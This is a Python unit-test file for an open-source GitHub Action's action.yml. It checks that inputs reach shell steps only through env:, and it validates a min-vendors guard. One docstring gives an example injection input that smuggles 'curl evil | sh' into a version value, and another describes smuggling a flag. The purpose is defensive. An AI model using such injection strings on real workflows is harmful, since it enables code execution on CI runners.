"""Unit tests for action.yml GitHub Action definition."""

from __future__ import annotations

import fnmatch
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent


class GitHubActionTests(unittest.TestCase):
    def test_action_file_exists_and_valid(self):
        action_path = REPO_ROOT / "action.yml"
        self.assertTrue(action_path.exists(), "action.yml must exist in root")

        content = action_path.read_text(encoding="utf-8")
        self.assertIn('name: "ai-jury Review"', content)
        self.assertIn('using: "composite"', content)
        self.assertIn("github-token:", content)
        self.assertIn("openai-api-key:", content)
        self.assertIn("anthropic-api-key:", content)
        self.assertIn("gemini-api-key:", content)
        self.assertIn("jury --pr", content)


class NoCallerInputReachesAShellBody(unittest.TestCase):
    """A `${{ }}` expression inside `run:` is substituted before bash parses it.

    So a caller-supplied value carrying a quote and a `;` becomes shell code:
    `version: '1.0"; curl evil | sh; "'` executes. #584 moved four inputs into
    `env:` for exactly this reason and left `inputs.version` behind — the sweep
    it described in the plural was done in the singular.

    Asserted as a rule over every step rather than as one line, because the
    single-line version is what let the fifth input slip through, and the next
    step someone adds is the same coin flip.
    """

    def _blocks(self, key: str) -> list[tuple[int, list[str]]]:
        """Bodies of every ``<key>:`` block in action.yml, as (line number, lines).

        A block scalar's body is the run of following lines indented deeper than
        the key that opened it, blank lines included — plus whatever trails the
        key on its own line, so a one-line ``run: cmd`` is swept like a ``run: |``
        block rather than read as an empty body. That is all this test needs
        from the file, so it reads it directly rather than through a YAML parser:
        ai-jury declares ``dependencies = []`` and three dev tools, and a test is
        not a good enough reason to make PyYAML the exception.

        The cost of hand-reading is that a restructured ``action.yml`` could go
        unrecognised and quietly sweep nothing, so
        :meth:`test_the_sweep_covers_every_run_body_in_the_file` pins the counts
        against the file's own text instead of trusting this scan.
        """
        lines = (REPO_ROOT / "action.yml").read_text(encoding="utf-8").splitlines()
        blocks: list[tuple[int, list[str]]] = []
        for index, line in enumerate(lines):
            stripped = line.lstrip()
            if not stripped.startswith(f"{key}:"):
                continue
            indent = len(line) - len(stripped)
            inline = stripped[len(key) + 1 :].strip()
            body: list[str] = [inline] if inline not in ("", "|", ">", "|-", ">-") else []
            for following in lines[index + 1 :]:
                if following.strip() and len(following) - len(following.lstrip()) <= indent:
                    break
                body.append(following)
            blocks.append((index + 1, body))
        return blocks

    def test_no_step_interpolates_an_expression_into_its_run_body(self):
        offenders = [
            (line_number, body_line.strip())
            for line_number, body in self._blocks("run")
            for body_line in body
            if "${{" in body_line
        ]
        self.assertEqual(
            [],
            offenders,
            "a GitHub expression is substituted into a shell body; pass it through "
            f"`env:` and reference it as a shell variable instead: {offenders}",
        )

    def test_the_sweep_covers_every_run_body_in_the_file(self):
        """Keeps the assertion above from passing vacuously after a refactor.

        Counted against the raw text, not the scan: if a restructured action.yml
        left a `run:` the block reader could not see, "no offenders" would be an
        artefact of reading nothing. Both numbers must move together.
        """
        text = (REPO_ROOT / "action.yml").read_text(encoding="utf-8")
        blocks = self._blocks("run")
        self.assertEqual(
            text.count("\n      run:"),
            len(blocks),
            "the block reader did not find every run: in action.yml; the sweep "
            "is checking less of the file than it appears to",
        )
        self.assertTrue(
            all(any(body_line.strip() for body_line in body) for _, body in blocks),
            "a run: block read as empty; the sweep would pass over it vacuously",
        )

    def test_every_caller_supplied_input_arrives_through_env(self):
        """The positive half: inputs must still reach the script, just safely."""
        env_values = "\n".join("\n".join(body) for _, body in self._blocks("env"))
        for name in ("inputs.version", "inputs.args", "inputs.github-token"):
            with self.subTest(input=name):
                self.assertIn(
                    name,
                    env_values,
                    f"{name} no longer reaches any step through env:",
                )


class TheActionDoesNotShipAFailSoftPanel(unittest.TestCase):
    """#682: a consumer of `berkayturanci/ai-jury@…` inherited fail-soft.

    `args` defaulted to `--auto --post` and `--min-vendors` was off, so an
    Action user got a run that exits 0 on a panel that collapsed to one vendor
    — while the marketing on the tin says cross-vendor. The guard is now an
    explicit input so it is visible in the Action's own documentation, and
    defaulted so nobody has to know to ask for it.

    Read from the file's text for the same reason the sweep above is: this
    project ships `dependencies = []`, and a test is not a good enough reason
    to make PyYAML the exception.
    """

    def setUp(self):
        self.text = (REPO_ROOT / "action.yml").read_text(encoding="utf-8")

    def test_the_input_exists_and_defaults_to_two(self):
        self.assertIn("min-vendors:", self.text)
        block = self.text.split("min-vendors:", 1)[1].split("version:", 1)[0]
        self.assertIn('default: "2"', block)

    def test_the_guard_is_appended_to_both_invocations(self):
        """PR mode and diff-file mode; missing it on one is missing it."""
        self.assertIn('jury --pr "$PR_NUM" $INPUT_ARGS $GUARD', self.text)
        self.assertIn("jury --diff-file - $INPUT_ARGS $GUARD", self.text)

    def test_an_explicit_caller_choice_is_not_overridden(self):
        """Passing the flag through `args` must not produce it twice.

        Driven off the real `case` patterns rather than a substring, so it
        tests the matching and not the spelling of one line. `fnmatch` and a
        POSIX `case` glob agree on these patterns (`*` only, no classes), which
        is what lets this stay stdlib-only and shell-free.
        """
        for args in (
            "--min-vendors 0",
            "--auto --post --min-vendors 3",
            "--min-vendors=0",
            "--auto --post --min-vendors=3",
            "--min-vendors=3 --auto",
            "--no-min-vendors",
            "--auto --no-min-vendors",
            "--no-min-vendors --post",
        ):
            with self.subTest(args=args, expected="suppressed"):
                self.assertTrue(self._guard_suppressed(args), args)

    def test_the_default_guard_still_applies_to_everyone_else(self):
        """The override must not swallow args that never mention the flag."""
        for args in (
            "",
            "--auto --post",
            "--severity high",
            "--min-vendors-report",
            "--post --minimal",
        ):
            with self.subTest(args=args, expected="appended"):
                self.assertFalse(self._guard_suppressed(args), args)

    def _guard_patterns(self) -> list[str]:
        """The globs from the `case " $INPUT_ARGS " in` block in action.yml."""
        block = self.text.split('case " $INPUT_ARGS " in', 1)[1].split("esac", 1)[0]
        patterns: list[str] = []
        for line in block.splitlines():
            arm = line.strip()
            if not arm.startswith("*"):
                continue
            patterns += [p.strip().replace('"', "") for p in arm.split(")", 1)[0].split("|")]
        self.assertTrue(patterns, "no case arms found in action.yml")
        return patterns

    def _guard_suppressed(self, args: str) -> bool:
        subject = f" {args} "
        return any(fnmatch.fnmatchcase(subject, p) for p in self._guard_patterns())

    def test_the_value_is_validated_before_it_is_word_split(self):
        """It is caller-supplied and lands unquoted in the command line.

        Without the digit check, `min-vendors: "--post"` would smuggle a flag
        into the invocation — the same class of hole #584 closed for `version`,
        one layer down.
        """
        self.assertIn("*[!0-9]*)", self.text)

    def test_it_travels_through_env_like_every_other_input(self):
        """Never as a `${{ }}` inside `run:` — see the sweep above."""
        self.assertIn("INPUT_MIN_VENDORS: ${{ inputs.min-vendors }}", self.text)


class AnEmptyMinVendorsMeansTheDefault(unittest.TestCase):
    """`min-vendors: ${{ vars.MIN_VENDORS }}` with the variable unset (#682, round 3).

    GitHub applies an input's `default:` only when the input is OMITTED. Pass it
    explicitly from an unset repository or organization variable and the step
    receives the empty string — which the first cut rejected with exit 2, hard-
    failing a workflow that had asked for nothing unusual. Empty now means "use
    the default"; a genuinely non-numeric value still fails, and still before
    the value is word-split into the command line.

    The shell is emulated rather than executed: this suite runs on the Windows
    matrix leg too, where there is no `sh`. `fnmatch` and a POSIX `case` glob
    agree on these patterns (`*` and one `[!…]` class), which is what makes the
    emulation faithful — and the parts it cannot emulate (the default literal,
    the ordering of the two branches) are pinned against the file's own text.
    """

    def setUp(self):
        self.text = (REPO_ROOT / "action.yml").read_text(encoding="utf-8")

    def _reject_patterns(self) -> list[str]:
        """The globs from the `case "$MIN_VENDORS" in` validation block.

        Every arm, not only the ones opening with `*`: an arm that rejects the
        empty string is spelled `''|…`, and skipping it would make the
        emulation silently kinder than the shell. A line is an arm when it ends
        a pattern list right after the `case` header or a previous `;;`.
        """
        self.assertTrue('case "$MIN_VENDORS" in' in self.text, "validation block not found")
        block = self.text.split('case "$MIN_VENDORS" in', 1)[1].split("esac", 1)[0]
        patterns: list[str] = []
        expect_arm = True
        for line in block.splitlines():
            arm = line.strip()
            if not arm:
                continue
            if expect_arm and arm.endswith(")"):
                patterns += [
                    p.strip().replace('"', "").replace("'", "") for p in arm[:-1].split("|")
                ]
                expect_arm = False
            elif arm == ";;":
                expect_arm = True
        self.assertTrue(patterns, "no validation case arms found in action.yml")
        return patterns

    def _default(self) -> str:
        """The literal the empty-value branch substitutes."""
        marker = 'if [ -z "$MIN_VENDORS" ]; then'
        self.assertTrue(
            marker in self.text, "no empty-value branch: an unset variable exits 2 again"
        )
        branch = self.text.split(marker, 1)[1].split("fi", 1)[0]
        return branch.split("MIN_VENDORS=", 1)[1].strip().strip('"')

    def _resolve(self, value: str) -> str:
        """What the step does with `value`: the guard it builds, or ``"exit 2"``."""
        resolved = self._default() if value == "" else value
        if any(fnmatch.fnmatchcase(resolved, p) for p in self._reject_patterns()):
            return "exit 2"
        return f"--min-vendors {resolved}"

    def test_an_unset_variable_resolves_to_the_default(self):
        self.assertEqual(self._resolve(""), "--min-vendors 2")

    def test_the_empty_default_matches_the_inputs_default(self):
        """Two spellings of the same number; they must not drift apart."""
        block = self.text.split("min-vendors:", 1)[1].split("version:", 1)[0]
        self.assertIn(f'default: "{self._default()}"', block)

    def test_a_real_value_still_reaches_the_command_line(self):
        for value in ("0", "2", "3", "10"):
            with self.subTest(value):
                self.assertEqual(self._resolve(value), f"--min-vendors {value}")

    def test_a_non_numeric_value_still_fails_the_step(self):
        """The hole this validation exists for stays closed."""
        for value in ("--post", "two", "-1", "2 3", " ", "2.0"):
            with self.subTest(value):
                self.assertEqual(self._resolve(value), "exit 2")

    def test_the_empty_check_runs_before_the_validation(self):
        """Order is the whole fix: validate first and "" is rejected again."""
        self.assertTrue(
            'if [ -z "$MIN_VENDORS" ]; then' in self.text, "no empty-value branch at all"
        )
        self.assertLess(
            self.text.index('if [ -z "$MIN_VENDORS" ]; then'),
            self.text.index('case "$MIN_VENDORS" in'),
        )

    def test_the_raw_input_is_not_what_reaches_the_command_line(self):
        """The guard is built from the resolved value, never from `$INPUT_MIN_VENDORS`."""
        self.assertIn('GUARD="--min-vendors $MIN_VENDORS"', self.text)
        self.assertNotIn('GUARD="--min-vendors $INPUT_MIN_VENDORS"', self.text)


if __name__ == "__main__":
    unittest.main()
